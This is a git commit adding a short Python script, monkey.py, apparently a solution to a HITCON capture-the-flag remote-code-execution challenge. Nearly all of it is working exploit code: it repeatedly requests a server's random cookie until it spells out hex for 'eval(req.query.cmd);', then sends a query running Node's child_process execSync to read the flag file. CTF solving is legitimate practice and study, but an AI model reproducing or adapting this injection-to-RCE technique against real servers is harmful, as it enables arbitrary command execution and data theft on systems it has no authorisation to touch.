16d36dc76885d49bcadc1c6bc4604f40d0d84b75
Ferreira <68820001+JMFerreiraa@users.noreply.github.com>
2022-11-27 23:35:12 +0000

    Create monkey.py

---
+++ monkey.py
@@ -0,0 +1,29 @@
+import requests
+import codecs
+
+url1 = "http://2k6gre4bmq.rce.chal.hitconctf.com/"
+
+command_hex = codecs.encode(b'eval(req.query.cmd);', "hex")
+print(command_hex)
+
+responseInitial = requests.get(url1)
+initial_cookie = responseInitial.cookies.get_dict()['code']
+print(initial_cookie)
+url = url1 + '/random'
+cookies = {'code': initial_cookie}
+position = 0
+while True:
+	r = requests.get(url, cookies=cookies)
+	new_cookie = r.cookies.get_dict()['code']
+
+	if(position < 40):
+		if new_cookie[4+position] == chr(command_hex[position]):
+			position+=1
+			cookies = {'code': new_cookie}
+			print("PROGRESS: " + str(position) + "/40" + " Sending: "  + new_cookie)
+
+	if(position == len(command_hex)):
+		break
+
+a = requests.get(url + "?cmd=require('child_process').execSync('cat%20%2Fflag*').toString()", cookies=cookies)
+print(a.text)
